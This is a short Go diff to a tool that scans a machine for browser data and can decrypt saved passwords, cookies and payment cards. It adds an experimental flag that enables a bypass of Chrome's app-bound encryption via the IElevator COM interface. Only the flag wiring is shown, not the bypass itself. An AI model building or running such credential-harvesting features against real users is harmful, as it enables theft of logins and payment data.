@@ -26,6 +26,7 @@ func main() {
 	maxDepth := flag.Int("depth", 20, "Maximum directory depth")
 	exclude := flag.String("exclude", "", "Comma-separated paths to exclude (e.g. TikTok,Discord)")
 	decryptBrowsers := flag.Bool("decrypt-browsers", false, "Inline-decrypt browser passwords/cookies/cards (requires -tags decrypt build)")
+	chromeV20 := flag.Bool("chrome-v20-experimental", false, "EXPERIMENTAL: attempt Chrome v127+ app-bound key bypass via IElevator COM (may crash on some Chrome builds)")
 	flag.Parse()
 
 	if !*quiet {
@@ -41,6 +42,10 @@ func main() {
 			fmt.Fprintln(os.Stderr, "[!] Decryption support not compiled in. Rebuild with: make build-full")
 		}
 		scanner.DecryptBrowsers = true
+	}
+	if *chromeV20 {
+		decrypt.EnableAppBoundV20()
+		fmt.Fprintln(os.Stderr, "[!] Chrome v20 app-bound bypass ENABLED (experimental — may crash)")
 	}
 	results := scanner.Run()
 
